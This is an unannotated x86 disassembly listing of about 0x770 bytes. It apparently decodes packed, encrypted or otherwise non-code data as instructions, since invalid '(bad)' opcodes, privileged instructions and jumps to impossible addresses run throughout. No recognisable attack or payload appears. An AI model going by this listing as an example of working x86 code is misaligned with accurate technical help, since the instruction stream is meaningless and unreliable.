  40abf0:	jne    0x40abf2
  40abf2:	dec    DWORD PTR [ebx+0x5545cc18]
  40abf8:	mov    DWORD PTR [ebx],esi
  40abfa:	shl    BYTE PTR [ebx],1
  40abfc:	inc    ebp
  40abfd:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40ac03:	retf   0x5575
  40ac06:	dec    DWORD PTR [ebx-0x5ba17e8]
  40ac0c:	(bad)  
  40ac0d:	stc    
  40ac0e:	in     al,dx
  40ac0f:	or     al,0x85
  40ac11:	dec    ebp
  40ac12:	clc    
  40ac13:	xor    eax,DWORD PTR [ebp+0x3]
  40ac16:	mov    ebp,ecx
  40ac18:	rol    BYTE PTR [eax],1
  40ac1a:	inc    ebp
  40ac1b:	add    BYTE PTR [eax-0x7747ab3],bh
  40ac21:	clc    
  40ac22:	inc    ebp
  40ac23:	retf   
  40ac24:	mov    edx,ebx
  40ac26:	in     al,dx
  40ac27:	(bad)  
  40ac28:	retf   
  40ac29:	into   
  40ac2a:	into   
  40ac2b:	scas   eax,DWORD PTR es:[edi]
  40ac2c:	dec    ebp
  40ac2d:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40ac33:	sub    ecx,esi
  40ac35:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ac38:	(bad)  
  40ac39:	mov    edi,eax
  40ac3b:	int3   
  40ac3c:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ac42:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ac49:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ac4f:	rdtsc  
  40ac51:	retf   0x559c
  40ac54:	(bad)  
  40ac55:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ac5c:	inc    ebp
  40ac5d:	add    eax,0xeb9c4d3f
  40ac62:	(bad)  
  40ac63:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ac69:	xor    ecx,DWORD PTR [ebp+0x33]
  40ac6c:	mov    eax,DWORD PTR [ebx]
  40ac6e:	call   0xce507776
  40ac73:	retf   0x55d1
  40ac76:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ac7c:	jmp    0x40ac77
  40ac7e:	add    BYTE PTR ds:0xebf44d8b,al
  40ac84:	push   ebp
  40ac85:	mov    ebp,DWORD PTR [ebx]
  40ac87:	mov    eax,0x33f8558b
  40ac8c:	retf   
  40ac8d:	xor    ecx,esi
  40ac8f:	add    edx,ecx
  40ac91:	add    eax,DWORD PTR [edx+0xca010f]
  40ac97:	push   ebp
  40ac98:	dec    ebp
  40ac99:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ac9f:	stc    
  40aca0:	rol    DWORD PTR ds:0xebce4dd6,cl
  40aca6:	scas   eax,DWORD PTR es:[edi]
  40aca7:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40acad:	xor    ebp,DWORD PTR [ebx]
  40acaf:	xor    edi,DWORD PTR [ebx]
  40acb1:	add    esi,DWORD PTR [edi+0x3]
  40acb4:	mov    ecx,DWORD PTR [edi]
  40acb6:	clc    
  40acb7:	retf   0x55cb
  40acba:	into   
  40acbb:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40acc2:	test   al,0x4d
  40acc4:	push   ebp
  40acc5:	jbe    0x40acfa
  40acc7:	mov    esi,DWORD PTR [ebx]
  40acc9:	mov    al,0x3
  40accb:	push   ebp
  40accc:	add    esi,DWORD PTR [ebx]
  40acce:	rdpmc  
  40acd0:	retf   0x5503
  40acd3:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40acd9:	dec    ebp
  40acda:	stc    
  40acdb:	mov    ecx,DWORD PTR [eax]
  40acdd:	or     BYTE PTR [ebp+0x4d],cl
  40ace0:	jmp    0x134ad70
  40ace5:	dec    ebp
  40ace6:	dec    ebp
  40ace7:	(bad)  
  40ace8:	mov    ebx,esp
  40acea:	clc    
  40aceb:	test   ebx,ecx
  40aced:	clc    
  40acee:	ror    DWORD PTR [ebp-0x2a],cl
  40acf1:	mov    esi,ecx
  40acf3:	lock scas eax,DWORD PTR es:[edi]
  40acf5:	inc    ebp
  40acf6:	mov    esi,DWORD PTR [ebx]
  40acf8:	hlt    
  40acf9:	pushf  
  40acfa:	jge    0x40ac87
  40acfc:	sub    ebx,esp
  40acfe:	cmp    ecx,ebx
  40ad00:	ja     0x40acd0
  40ad02:	mov    ebp,DWORD PTR [eax-0x58]
  40ad05:	dec    ebp
  40ad06:	xor    ecx,DWORD PTR [di+0x3]
  40ad0a:	mov    esp,esp
  40ad0c:	clc    
  40ad0d:	push   ebp
  40ad0e:	retf   
  40ad0f:	mov    dl,bl
  40ad11:	adc    esi,edx
  40ad13:	jb     0x40ace3
  40ad15:	add    BYTE PTR [edi-0xb7474b3],ch
  40ad1b:	lock jge 0x40ace9
  40ad1e:	sub    ecx,DWORD PTR [ebp+0x3b]
  40ad21:	mov    esi,DWORD PTR [edi-0x20]
  40ad24:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  40ad2b:	mov    BYTE PTR [ebx-0x34b20729],cl
  40ad31:	mov    edx,ebx
  40ad33:	lock (bad) 
  40ad35:	ror    esi,cl
  40ad37:	push   ebp
  40ad38:	scas   eax,DWORD PTR es:[edi]
  40ad39:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40ad3f:	sahf   
  40ad40:	sub    esi,DWORD PTR [edx]
  40ad42:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40ad48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad49:	xor    esp,DWORD PTR [ebx]
  40ad4b:	add    ecx,DWORD PTR [ebp-0x1c]
  40ad4e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad51:	mov    bl,cl
  40ad53:	cmp    dl,bl
  40ad55:	jb     0x40ad25
  40ad57:	add    dh,dl
  40ad59:	dec    ebp
  40ad5a:	scas   eax,DWORD PTR es:[edi]
  40ad5b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ad61:	shr    DWORD PTR [ebx],cl
  40ad63:	into   
  40ad64:	cmp    edx,esi
  40ad66:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ad6c:	dec    ebp
  40ad6d:	dec    ebp
  40ad6e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ad74:	retf   
  40ad75:	xor    edx,esi
  40ad77:	add    ecx,esi
  40ad79:	imul   ecx,edx
  40ad7c:	mov    DWORD PTR [ebp+0x8],edx
  40ad7f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ad82:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ad88:	add    esi,DWORD PTR [ebx]
  40ad8a:	rol    BYTE PTR [ebx],0x45
  40ad8d:	sysexit 
  40ad8f:	xlat   BYTE PTR ds:[ebx]
  40ad90:	pushf  
  40ad91:	jge    0x40ad1c
  40ad93:	xor    esp,eax
  40ad95:	sub    eax,DWORD PTR [ebp-0x73]
  40ad98:	(bad)  
  40ad99:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ada0:	dec    ebp
  40ada1:	xchg   BYTE PTR [ebx],dh
  40ada3:	inc    DWORD PTR [ebx]
  40ada5:	(bad)  
  40ada6:	jmp    0x40adf5
  40ada8:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40adae:	dec    ebp
  40adaf:	into   
  40adb0:	mov    ebp,DWORD PTR [edi-0x23737420]
  40adb6:	sahf   
  40adb7:	shl    DWORD PTR [edx],cl
  40adb9:	retf   0x5588
  40adbc:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40adc2:	add    eax,DWORD PTR [eax]
  40adc4:	in     al,0x4d
  40adc6:	push   ebp
  40adc7:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40adcd:	bound  eax,QWORD PTR [eax]
  40adcf:	int    0x4d
  40add1:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40add7:	dec    ebp
  40add8:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40adde:	jge    0x40adae
  40ade0:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ade6:	add    cl,dh
  40ade8:	dec    ebp
  40ade9:	dec    DWORD PTR [ebx-0x2c032301]
  40adef:	inc    ebp
  40adf0:	push   ebp
  40adf1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40adf7:	lea    ebx,[esi-0x7400cdac]
  40adfd:	push   eax
  40adfe:	mov    ah,0x45
  40ae00:	push   ebp
  40ae01:	mov    esi,DWORD PTR [ebx]
  40ae03:	les    esi,FWORD PTR [ebx]
  40ae05:	add    BYTE PTR [ebx],al
  40ae07:	inc    DWORD PTR [ebx]
  40ae09:	mov    ecx,DWORD PTR [edi]
  40ae0b:	cld    
  40ae0c:	retf   0x4d80
  40ae0f:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ae15:	jne    0x40ada2
  40ae17:	(bad)  
  40ae18:	in     al,dx
  40ae19:	ror    bl,1
  40ae1b:	pop    edi
  40ae1c:	into   
  40ae1d:	add    BYTE PTR [edi-0xf2f7475],ch
  40ae23:	not    bl
  40ae25:	adc    al,0xca
  40ae27:	inc    ebp
  40ae28:	push   ebp
  40ae29:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ae2f:	push   0xaf80d6
  40ae34:	mov    eax,DWORD PTR [eax]
  40ae36:	fdiv   st(7),st
  40ae38:	sti    
  40ae39:	sbb    dh,cl
  40ae3b:	pop    esi
  40ae3c:	xchg   esp,eax
  40ae3d:	leave  
  40ae3e:	sahf   
  40ae3f:	add    al,0x32
  40ae41:	push   ebp
  40ae42:	cmp    ebp,esp
  40ae44:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ae48:	dec    DWORD PTR [ecx-0x740f0375]
  40ae4e:	push   ebp
  40ae4f:	cld    
  40ae50:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ae56:	retf   0x558b
  40ae59:	clc    
  40ae5a:	xor    esi,eax
  40ae5c:	add    esi,DWORD PTR [ebp-0x75]
  40ae5f:	(bad)  
  40ae60:	hlt    
  40ae61:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  40ae68:	mov    DWORD PTR [edx],ecx
  40ae6a:	hlt    
  40ae6b:	(bad)  
  40ae6c:	dec    ebp
  40ae6d:	add    dh,BYTE PTR [ebx]
  40ae6f:	leave  
  40ae70:	mov    edx,0xffec8d55
  40ae75:	push   ecx
  40ae76:	rol    DWORD PTR [ebp+0x55],1
  40ae79:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ae7f:	mov    eax,0xf8030b33
  40ae84:	lar    ecx,di
  40ae87:	push   ebp
  40ae88:	retf   0x863b
  40ae8b:	jne    0x40ae8a
  40ae8d:	mov    edi,edi
  40ae8f:	or     BYTE PTR [ebp+0x41],dh
  40ae92:	mov    esp,eax
  40ae94:	cld    
  40ae95:	inc    eax
  40ae96:	mov    al,0x29
  40ae98:	add    DWORD PTR [ecx+0x0],eax
  40ae9b:	loope  0x40ae22
  40ae9d:	inc    ecx
  40ae9e:	call   eax
  40aea0:	inc    edx
  40aea2:	mov    eax,DWORD PTR [eax]
  40aea4:	cld    
  40aea5:	mov    eax,DWORD PTR [eax+0x8d0151]
  40aeab:	clc    
  40aeac:	xor    BYTE PTR [ebp+0x45],al
  40aeaf:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40aeb5:	loopne 0x40aeb6
  40aeb7:	mov    edi,edi
  40aeb9:	mov    ecx,eax
  40aebb:	clc    
  40aebc:	jne    0x40ae8e
  40aebe:	call   0x81c1c7
  40aec3:	sub    DWORD PTR [ebp+0x45],esi
  40aec6:	test   esi,eax
  40aec8:	je     0x40aecb
  40aeca:	mov    eax,esi
  40aecc:	cld    
  40aecd:	or     DWORD PTR [eax+0x401c9],eax
  40aed3:	push   ebp
  40aed4:	add    ah,ch
  40aed6:	add    BYTE PTR [ecx+0x6a],dl
  40aed9:	inc    ebp
  40aeda:	push   esi
  40aedb:	mov    DWORD PTR [eax-0x4],edx
  40aede:	pop    edi
  40aedf:	mov    ebx,DWORD PTR [ebx-0x4]
  40aee2:	ret    0xbe
  40aee5:	push   es
  40aee6:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40aeec:	clc    
  40aeed:	lock inc ebp
  40aeef:	jne    0x40af47
  40aef1:	(bad)  
  40aef2:	jne    0x40aef8
  40aef4:	mov    eax,0xf841ba66
  40aef9:	rol    BYTE PTR [esi],1
  40aefb:	(bad)  
  40aefc:	jne    0x40af2f
  40aefe:	cmp    eax,ebx
  40af00:	pop    esi
  40af01:	mov    ecx,DWORD PTR [eax]
  40af03:	push   ecx
  40af04:	inc    ecx
  40af05:	lea    edi,[eax+edi*8+0x42]
  40af09:	inc    ebp
  40af0a:	ror    DWORD PTR [ebx-0x408303be],0x41
  40af11:	xchg   edx,ebp
  40af13:	mov    ebx,eax
  40af15:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40af1b:	or     edi,eax
  40af1d:	inc    ebp
  40af1e:	inc    ebp
  40af1f:	(bad)  
  40af20:	mov    ecx,DWORD PTR [eax]
  40af22:	cld    
  40af23:	(bad)  
  40af24:	jmp    0x40af27
  40af26:	mov    eax,esi
  40af28:	mov    DWORD PTR ds:0x4f8c98b,eax
  40af2e:	rcl    BYTE PTR [esi+0xf],1
  40af31:	iret   
  40af32:	inc    ebp
  40af33:	leave  
  40af34:	(bad)  
  40af35:	dec    DWORD PTR [ecx]
  40af37:	mov    eax,esi
  40af39:	mov    eax,DWORD PTR [edi]
  40af3b:	mov    dh,0xd1
  40af3e:	push   es
  40af3f:	nop
  40af40:	(bad)  
  40af41:	inc    DWORD PTR [ebx]
  40af43:	push   esi
  40af44:	leave  
  40af45:	iret   
  40af46:	add    al,0x46
  40af48:	push   ebp
  40af49:	in     eax,0xec
  40af4b:	push   ebp
  40af4c:	push   ecx
  40af4d:	inc    DWORD PTR [ebp+0x56]
  40af50:	mov    DWORD PTR [esi-0x4],eax
  40af53:	loope  0x40afaa
  40af55:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40af5b:	add    al,BYTE PTR [edx]
  40af5d:	mov    edx,DWORD PTR [ebp-0x17]
  40af60:	cmp    edi,esi
  40af62:	jne    0x40af63
  40af64:	(bad)  
  40af65:	push   esi
  40af66:	pop    es
  40af67:	push   ebp
  40af68:	mov    ebp,esp
  40af6a:	or     BYTE PTR [ebp+0x41],al
  40af6d:	add    edi,edx
  40af6f:	sub    BYTE PTR [eax-0x4],al
  40af72:	shl    BYTE PTR [ebp-0x3e],0x1
  40af76:	add    BYTE PTR [ebx+ecx*4],bl
  40af79:	mov    edx,DWORD PTR [ecx+0x14]
  40af7c:	lea    edx,[edx-0x1ba7508]
  40af82:	push   esi
  40af83:	enter  0xd375,0xb8
  40af87:	test   DWORD PTR [esi],0x6ce0750
  40af8d:	enter  0xd375,0x3b
  40af91:	neg    DWORD PTR [esi+0x50]
  40af94:	or     cl,dl
  40af96:	inc    edx
  40af97:	(bad)  
  40af98:	in     eax,dx
  40af99:	in     al,dx
  40af9a:	(bad)  
  40af9b:	sub    eax,DWORD PTR [ebx]
  40af9d:	inc    eax
  40af9e:	in     eax,dx
  40af9f:	push   eax
  40afa0:	add    dl,BYTE PTR [eax-0x37]
  40afa3:	push   edi
  40afa4:	push   ebp
  40afa5:	imul   ah
  40afa7:	adc    DWORD PTR [ecx-0x1],0x45
  40afab:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40afb1:	lea    edi,[eax-0x7fff4ca]
  40afb7:	mov    eax,0x4550402
  40afbc:	cmp    ebp,ecx
  40afbe:	jne    0x40af6b
  40afc0:	mov    eax,DWORD PTR ds:0x241e808
  40afc6:	loope  0x40afc8
  40afc8:	inc    eax
  40afc9:	stc    
  40afca:	xlat   BYTE PTR ds:[ebx]
  40afcb:	ss inc ecx
  40afcd:	aas    
  40afce:	in     eax,0x7d
  40afd0:	ret    0x8b
  40afd3:	lock mov edi,DWORD PTR [ebp-0x18]
  40afd7:	and    edi,edi
  40afd9:	mov    edi,edi
  40afdb:	call   0xe40eb0b7
  40afe0:	push   es
  40afe1:	add    al,ch
  40afe3:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40afea:	(bad)  
  40afeb:	hlt    
  40afec:	add    eax,0xffd3e87d
  40aff1:	cmp    bh,0x8
  40aff4:	(bad)  
  40aff5:	fld    DWORD PTR [esi]
  40aff7:	out    dx,al
  40aff8:	call   0xff9faf00
  40affd:	cmp    al,0x46
  40afff:	shr    edx,0x8
  40b002:	(bad)  
  40b003:	pop    es
  40b004:	fisttp QWORD PTR [ebp+0xe577eff]
  40b00a:	push   ebx
  40b00b:	add    BYTE PTR [ebx+0x24008b56],cl
  40b011:	add    BYTE PTR [ebp+0x50],al
  40b014:	push   eax
  40b015:	add    DWORD PTR [ebx+0x757d1834],ecx
  40b01b:	sub    edx,DWORD PTR [esi-0x24]
  40b01e:	jne    0x40afd6
  40b020:	lods   eax,DWORD PTR ds:[esi]
  40b021:	mov    edx,DWORD PTR [edx-0x34]
  40b024:	dec    esi
  40b025:	out    0x83,eax
  40b027:	into   
  40b028:	push   edi
  40b02a:	loopne 0x40affa
  40b02c:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40b030:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40b037:	rol    DWORD PTR [edx],0x8
  40b03a:	mov    esp,ecx
  40b03c:	cmp    DWORD PTR [ebx],0xc
  40b03f:	mov    esi,0x5001c0
  40b044:	push   eax
  40b045:	push   cs
  40b046:	push   eax
  40b047:	(bad)  
  40b048:	sub    edx,edi
  40b04a:	push   esi
  40b04b:	adc    al,0xcb
  40b04d:	ins    DWORD PTR es:[edi],dx
  40b04e:	mov    eax,0x203e8
  40b053:	add    al,ah
  40b055:	inc    esi
  40b056:	mov    al,ch
  40b058:	pop    es
  40b059:	add    DWORD PTR [eax],0x1
  40b05c:	add    dh,al
  40b05e:	add    ah,ch
  40b060:	rol    DWORD PTR [edx-0xd],1
  40b063:	cli    
  40b064:	push   0x4a
  40b066:	pop    ecx
  40b067:	retf   0xfe6
  40b06a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40b070:	(bad)  
  40b071:	dec    BYTE PTR [ebx+0x45b1fc72]
  40b077:	(bad)  
  40b078:	sub    ebp,DWORD PTR [ebx]
  40b07a:	and    al,0x52
  40b07c:	(bad)  
  40b07d:	dec    edi
  40b07e:	inc    ebp
  40b07f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40b086:	add    BYTE PTR [ebp-0x7b],dh
  40b089:	pop    eax
  40b08a:	add    BYTE PTR [edx+0x0],bl
  40b08d:	pop    edx
  40b08e:	dec    ebp
  40b08f:	jmp    DWORD PTR [ebx]
  40b091:	and    al,0xec
  40b093:	push   edx
  40b094:	out    0x64,eax
  40b096:	jmp    0xd3f2a69b
  40b09b:	jmp    0x40b0f5
  40b09d:	mov    al,0xfe
  40b09f:	dec    BYTE PTR [ebp-0x18fd8018]
  40b0a5:	add    BYTE PTR [esi+ebp*1],bh
  40b0a8:	pop    edx
  40b0a9:	icebp  
  40b0aa:	mov    eax,cs
  40b0ac:	ins    BYTE PTR es:[edi],dx
  40b0ad:	adc    eax,0x75510000
  40b0b2:	mov    esi,0x70158
  40b0b7:	or     DWORD PTR [eax-0x74f48dfe],esi
  40b0bd:	mov    edi,esp
  40b0bf:	cld    
  40b0c0:	jge    0x40b137
  40b0c2:	(bad)  
  40b0c4:	aas    
  40b0c5:	and    al,0x6d
  40b0c7:	adc    cl,0x1
  40b0ca:	mov    eax,DWORD PTR [eax]
  40b0cc:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40b0d2:	dec    ebp
  40b0d3:	add    eax,ebp
  40b0d5:	add    BYTE PTR [edx],al
  40b0d7:	fadd   DWORD PTR [eax]
  40b0d9:	stc    
  40b0da:	enter  0xee00,0x8b
  40b0de:	sbb    eax,0x1
  40b0e1:	sbb    esi,ecx
  40b0e3:	in     al,0x0
  40b0e5:	in     eax,dx
  40b0e6:	add    BYTE PTR [eax],al
  40b0e8:	jne    0x40b075
  40b0ea:	cmp    edx,esp
  40b0ec:	jb     0x40b0f7
  40b0ee:	jmp    0x40b165
  40b0f0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40b0f6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40b0fc:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40b102:	jb     0x40b08d
  40b104:	pop    edx
  40b105:	fadd   QWORD PTR [ebx-0x7445faa1]
  40b10b:	or     dh,BYTE PTR [edx+0x0]
  40b10e:	inc    edx
  40b10f:	or     dl,bh
  40b111:	xlat   BYTE PTR ds:[ebx]
  40b112:	dec    edx
  40b113:	push   edi
  40b114:	add    al,0x7
  40b116:	leave  
  40b117:	rol    DWORD PTR [edx+eax*1],0x7
  40b11b:	add    ecx,ecx
  40b11d:	mov    edx,ecx
  40b11f:	int3   
  40b120:	jmp    0x40b0e0
  40b122:	mov    al,0x0
  40b124:	(bad)  
  40b125:	jne    0x40b10f
  40b127:	mov    eax,DWORD PTR [edx]
  40b129:	call   0xc1552e2e
  40b12e:	pop    edi
  40b12f:	add    ebx,DWORD PTR [ecx-0x37]
  40b132:	pop    ecx
  40b133:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40b13a:	push   es
  40b13b:	mov    eax,DWORD PTR [eax]
  40b13d:	int3   
  40b13e:	add    ch,al
  40b140:	jae    0x40b12a
  40b142:	int    0x1
  40b144:	enter  0x3000,0x18
  40b148:	add    BYTE PTR [ebp+0x75],al
  40b14b:	mov    esi,DWORD PTR [eax-0x171f0134]
  40b151:	push   0x2
  40b153:	pop    ecx
  40b154:	add    BYTE PTR [eax],cl
  40b156:	push   ebx
  40b157:	lea    edi,[edi+eax*2]
  40b15a:	mov    al,0x1
  40b15c:	jb     0x40b15e
  40b15e:	mov    al,0x10
  40b160:	push   eax
  40b161:	add    al,0x75
  40b163:	add    BYTE PTR [ebx],ch
  40b165:	add    ebx,esp
  40b167:	int3   
  40b168:	jne    0x40b17a
  40b16a:	movsx  edx,cl
  40b16d:	add    DWORD PTR [eax],eax
  40b16f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40b176:	mov    gs,edi
  40b178:	add    BYTE PTR [eax-0x50],ch
  40b17b:	add    al,ch
  40b17d:	mov    eax,DWORD PTR [ecx]
  40b17f:	sub    eax,DWORD PTR [eax]
  40b181:	jb     0x40b1f8
  40b183:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40b187:	jge    0x40b171
  40b189:	add    al,0x1
  40b18b:	add    DWORD PTR [eax],0x0
  40b18e:	jne    0x40b190
  40b190:	je     0x40b1d7
  40b192:	mov    eax,DWORD PTR [edi]
  40b194:	ror    BYTE PTR [ebp+0x4d],1
  40b197:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40b19e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40b1a4:	mov    DWORD PTR [ebx],ebp
  40b1a6:	fadd   DWORD PTR [eax+0x75]
  40b1a9:	inc    eax
  40b1aa:	pop    eax
  40b1ab:	lea    ebx,[ecx+0x4f]
  40b1ae:	push   0xb1000003
  40b1b3:	out    dx,eax
  40b1b4:	add    ebp,DWORD PTR [edx+edx*2]
  40b1b7:	add    BYTE PTR [ebx+ecx*4],bh
  40b1ba:	mov    ch,BYTE PTR [ebx]
  40b1bc:	jb     0x40b230
  40b1be:	add    al,0x89
  40b1c0:	push   eax
  40b1c1:	call   0x8428ff33
  40b1c6:	add    DWORD PTR [eax+eax*1],eax
  40b1c9:	jae    0x40b1df
  40b1cb:	icebp  
  40b1cc:	inc    ebp
  40b1cd:	mov    eax,DWORD PTR gs:[ecx]
  40b1d0:	int3   
  40b1d1:	out    dx,al
  40b1d2:	loopne 0x40b221
  40b1d4:	sub    eax,DWORD PTR [edx]
  40b1d6:	push   0xffffff83
  40b1d8:	pop    esi
  40b1d9:	push   cs
  40b1da:	jl     0x40b1f5
  40b1dc:	add    al,0xaf
  40b1de:	xor    eax,0x832b6d00
  40b1e3:	mov    eax,DWORD PTR [edx]
  40b1e5:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40b1eb:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40b1f1:	inc    ebp
  40b1f2:	shr    ebx,0x3
  40b1f5:	or     DWORD PTR [eax],0x4
  40b1f8:	push   0xffffffa5
  40b1fa:	pop    esi
  40b1fb:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40b202:	jmp    0x40b261
  40b204:	mov    edi,0xff0272
  40b209:	fdivr  QWORD PTR [ebp+0x5d]
  40b20c:	push   0x4e
  40b20e:	pop    ecx
  40b20f:	call   0x40f614
  40b214:	mov    DWORD PTR [ebx],eax
  40b216:	in     al,0xc8
  40b218:	rol    BYTE PTR [ebp-0x75],0xc1
  40b21c:	call   0xaab3fd
  40b221:	pop    esi
  40b222:	enter  0xceff,0x8b
  40b226:	repz mov ecx,DWORD PTR [ebp-0x34]
  40b22a:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40b231:	je     0x40b233
  40b233:	or     DWORD PTR [ebx-0x74183b24],eax
  40b239:	jne    0x40b21f
  40b23b:	jmp    0x40b236
  40b23d:	push   DWORD PTR [edx-0x24]
  40b240:	push   0x4d
  40b242:	pop    ecx
  40b243:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40b247:	jge    0x40b24f
  40b249:	mov    eax,eax
  40b24b:	sub    ebp,DWORD PTR [edx+0x24]
  40b24e:	pop    esi
  40b24f:	inc    ebp
  40b250:	mov    esp,0x8b6077
  40b255:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40b25b:	lods   al,BYTE PTR ds:[esi]
  40b25c:	add    BYTE PTR [ebx],bh
  40b25e:	enter  0xce73,0x49
  40b262:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40b26a:	stc    
  40b26b:	jge    0x40b2df
  40b26d:	jnp    0xdd4035ce
  40b273:	call   0xc3b349
  40b278:	fadd   st(0),st
  40b27a:	dec    esi
  40b27b:	ins    BYTE PTR es:[edi],dx
  40b27c:	stc    
  40b27d:	cmp    al,0x73
  40b27f:	push   ebp
  40b280:	mov    eax,0xf8028b
  40b285:	jne    0x40b248
  40b287:	mov    esi,ecx
  40b289:	mov    esp,DWORD PTR [ebp+0x2c]
  40b28c:	add    edi,DWORD PTR [ebp-0x24]
  40b28f:	sub    esp,eax
  40b291:	and    al,0x45
  40b293:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40b299:	sbb    al,0xee
  40b29b:	pop    esi
  40b29c:	call   0x80b2cc
  40b2a1:	fsubr  st,st(3)
  40b2a3:	sti    
  40b2a4:	add    BYTE PTR gs:[ecx],bh
  40b2a7:	add    eax,esp
  40b2a9:	add    DWORD PTR [esi],eax
  40b2ab:	rol    DWORD PTR [ebp+0x8],0x29
  40b2af:	mov    esp,eax
  40b2b1:	clc    
  40b2b2:	jne    0x40b329
  40b2b4:	mov    eax,0x8b0673
  40b2b9:	loopne 0x40b300
  40b2bb:	loopne 0x40b246
  40b2bd:	lods   al,BYTE PTR ds:[esi]
  40b2be:	int3   
  40b2bf:	inc    ebp
  40b2c0:	mov    DWORD PTR gs:[eax+edi*8],eax
  40b2c4:	add    al,0xc3
  40b2c6:	sub    ecx,DWORD PTR [ebp+0x47]
  40b2c9:	(bad)  
  40b2cb:	shr    BYTE PTR [ebp-0x1f],0xe8
  40b2cf:	add    eax,DWORD PTR [eax]
  40b2d1:	call   0x64273d6
  40b2d6:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40b2dc:	dec    esi
  40b2dd:	ins    DWORD PTR es:[edi],dx
  40b2de:	in     al,dx
  40b2df:	lea    eax,[eax]
  40b2e1:	inc    ebp
  40b2e2:	inc    ebp
  40b2e3:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40b2e9:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40b2f3:	and    al,0xdc
  40b2f5:	ror    DWORD PTR [edx+0x24],0xf7
  40b2f9:	or     BYTE PTR [ebp+0x4c],dh
  40b2fc:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40b300:	stos   BYTE PTR es:[edi],al
  40b301:	adc    edx,edi
  40b303:	inc    esp
  40b304:	add    edi,DWORD PTR [eax]
  40b306:	jne    0x40b2eb
  40b308:	mov    DWORD PTR [eax-0x7449db04],ecx
  40b30e:	cmp    ecx,DWORD PTR [edi]
  40b310:	sub    BYTE PTR [ebp-0x7e],dl
  40b313:	sar    ebp,0xb
  40b316:	jmp    FWORD PTR [edi+0x2400392a]
  40b31c:	sub    esi,DWORD PTR [ebx-0x73]
  40b31f:	mov    esp,DWORD PTR [ecx+edi*4]
  40b322:	mov    ecx,DWORD PTR [eax]
  40b324:	and    BYTE PTR [eax],al
  40b326:	jne    0x40b2f2
  40b328:	sub    ebp,ecx
  40b32a:	sbb    BYTE PTR [esi+0x32],ah
  40b32d:	dec    ebp
  40b32e:	push   ebp
  40b32f:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40b335:	ret    
  40b336:	mov    edx,ebp
  40b338:	leave  
  40b339:	sub    DWORD PTR [esi+0x24],ebx
  40b33c:	ret    0x2b
  40b33f:	pop    ax
  40b341:	push   ebp
  40b342:	rol    BYTE PTR [ebx],0xeb
  40b345:	add    DWORD PTR [ecx+0x6c0001],0x40
  40b34c:	jb     0x40b3a3
  40b34e:	ret    
  40b34f:	in     al,dx
  40b350:	jecxz  0x40b2dd
  40b352:	push   esi
  40b353:	xchg   esp,eax
  40b354:	jne    0x40b356
  40b356:	cmp    edx,DWORD PTR [esi+0x1c]
